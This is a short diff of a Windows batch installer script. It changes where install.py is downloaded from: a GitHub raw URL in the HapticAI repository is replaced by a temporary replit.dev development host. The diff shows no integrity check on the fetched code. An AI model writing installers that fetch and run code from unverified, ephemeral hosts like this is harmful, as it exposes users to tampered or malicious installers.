@@ -213,7 +213,7 @@ if exist "%INSTALL_DIR%install.py" (
     echo   install.py not found locally, downloading from GitHub...
 
     REM Use a more reliable download method with proper variable expansion
-    set "INSTALLER_URL=https://raw.githubusercontent.com/HapticAI/HapticAI-Powered/main/install.py"
+    set "INSTALLER_URL=https://1496e5f1-f302-402a-b2dd-cd25d95f85b5-00-3k43daw6ksczj-p7li0ssq.riker.replit.dev/api/hapticai/install.py"
     set "INSTALLER_FILE=%TEMP_DIR%\install.py"
 
     echo   Downloading from: !INSTALLER_URL!
